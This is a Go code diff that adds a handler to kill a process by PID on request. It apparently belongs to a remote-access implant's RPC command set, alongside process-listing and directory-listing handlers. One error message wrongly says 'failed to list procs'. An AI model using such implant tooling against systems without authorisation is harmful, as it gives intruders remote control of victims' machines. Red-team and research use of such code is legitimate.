@@ -99,6 +99,31 @@ func psHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func terminateHandler(data []byte, resp RPCResponse) {
+	var errStr string
+	terminateReq := &pb.TerminateReq{}
+	err := proto.Unmarshal(data, terminateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err = ps.Kill(int(terminateReq.Pid))
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("failed to list procs %v", err)
+		// {{end}}
+		errStr = err.Error()
+	}
+
+	termResp := &pb.Terminate{
+		Err: errStr,
+	}
+	data, err = proto.Marshal(termResp)
+	resp(data, err)
+}
+
 func dirListHandler(data []byte, resp RPCResponse) {
 	dirListReq := &pb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
